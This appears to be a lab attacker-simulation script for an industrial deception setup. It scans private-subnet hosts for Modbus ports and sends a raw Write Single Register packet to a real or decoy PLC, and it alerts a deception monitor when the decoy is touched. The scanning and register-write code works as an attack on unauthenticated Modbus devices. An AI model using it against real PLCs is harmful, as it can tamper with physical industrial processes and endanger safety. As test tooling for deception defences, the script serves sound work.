import socket
import sys
import time

TARGET_SUBNET = "172.20.0."
DECEPTION_MONITOR_IP = "172.20.0.100"
DECEPTION_MONITOR_PORT = 5022

def scan_network():
    print("[*] Attacker starting Modbus TCP port scan across 172.20.0.0/24...")
    found_assets = []

    # สแกนหาพอร์ต Modbus (502 / 5020) ในวงการผลิต
    targets = [20, 99] # สแกนเจาะจง PLC จริง (.20) และ PLC ปลอม (.99)
    ports_to_check = [502, 5020]
    for last_octet in targets:
        ip = f"{TARGET_SUBNET}{last_octet}"
        print(f"  ↳ Scanning {ip}...")
        asset_found = False
        for port in ports_to_check:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                result = s.connect_ex((ip, port))
                if result == 0:
                    print(f"  [+] DISCOVERED OPEN MODBUS PLC: {ip}:{port} !")
                    found_assets.append(f"{ip}:{port}")
                    asset_found = True

                    # หากแตะต้องเครื่อง Decoy (.99) ส่งสัญญาณ Trap ไปยัง Deception Monitor
                    if last_octet == 99:
                        notify_deception_monitor(ip)
                    s.close()
                    break
                s.close()
            except Exception:
                pass
        time.sleep(0.5)
    return found_assets

def notify_deception_monitor(target_ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((DECEPTION_MONITOR_IP, DECEPTION_MONITOR_PORT))
        s.sendall(f"Unauthorized Modbus Scan / Connection Attempt on Decoy Asset {target_ip}".encode('utf-8'))
        s.close()
    except Exception:
        pass

def attack_plc(ip):
    print(f"[*] Sending malicious Modbus Write command to target PLC: {ip}...")
    ports_to_check = [502, 5020]
    for port in ports_to_check:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            # Modbus Write Single Register Packet
            packet = b"\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x00\xff"
            s.sendall(packet)
            resp = s.recv(1024)
            print(f"  [+] Packet sent to {ip}:{port}. Response received: {resp.hex()}")
            s.close()
            return
        except Exception as e:
            pass
    print(f"  [-] Connection error to {ip}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 attacker_scan.py [scan|attack-real|attack-decoy]")
        sys.exit(1)

    mode = sys.argv[1]
    if mode == "scan":
        scan_network()
    elif mode == "attack-real":
        attack_plc("172.20.0.20")
    elif mode == "attack-decoy":
        print("[!] Attacker targeting Decoy PLC (172.20.0.99)...")
        notify_deception_monitor("172.20.0.99")
        attack_plc("172.20.0.99")
    else:
        print("Usage: python3 attacker_scan.py [scan|attack-real|attack-decoy]")

if __name__ == "__main__":
    main()
